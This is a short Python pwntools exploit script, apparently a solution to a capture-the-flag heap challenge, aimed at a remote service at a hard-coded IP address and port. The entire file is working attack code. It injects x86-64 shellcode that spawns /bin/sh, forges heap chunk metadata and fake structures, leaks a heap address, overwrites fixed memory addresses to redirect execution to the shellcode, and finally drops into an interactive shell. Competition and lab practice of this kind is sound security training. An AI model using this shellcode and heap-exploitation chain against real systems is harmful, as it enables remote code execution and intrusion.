from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('128.199.135.210', 31334)
def edit(index,dat):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('>')
  s.sendline(str(index))
  s.recvuntil('new skin:')
  s.sendline(dat)
s.recvuntil('name:')
sc = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
dat = p64(0)+p64(0)+p64(0x4)
dat2 = p64(0) + p64(0x4)*2
s.sendline(dat*2+'\x00'+dat2*2+"A"*0x20+sc)
s.recvuntil('>')
s.sendline('Y')
s.recvuntil('>')
s.sendline('2')
s.recvuntil('>')
s.sendline('5')
s.recvuntil('?')
dat = "A"*0x10 + p64(0) + p64(0x1c1)
s.sendline(dat)
s.recvuntil('>')
s.sendline('5')
s.recvuntil('?')
s.sendline('AAAAAA')
s.recvuntil('>')
s.sendline('4')
edit(0,dat)
fake_struct = p64(0)*2+p64(0x0601DA8)
edit(1,fake_struct)
s.recvuntil('>')
s.sendline('2')
s.recvuntil('>')
s.sendline('4')
heap = u64(s.recvuntil('Blink')[-8-4:-8]+"\x00"*4)
log.info("HEAP : 0x%x"%heap)
fake_struct2 = p64(0)*2+p64(heap+0x100)
edit(1,fake_struct2)
edit(0,sc)
fake_struct3 = p64(0)*2+p64(0x601CF8)
edit(1,fake_struct3)
raw_input()
edit(0,p64(heap+0x100))
s.interactive()
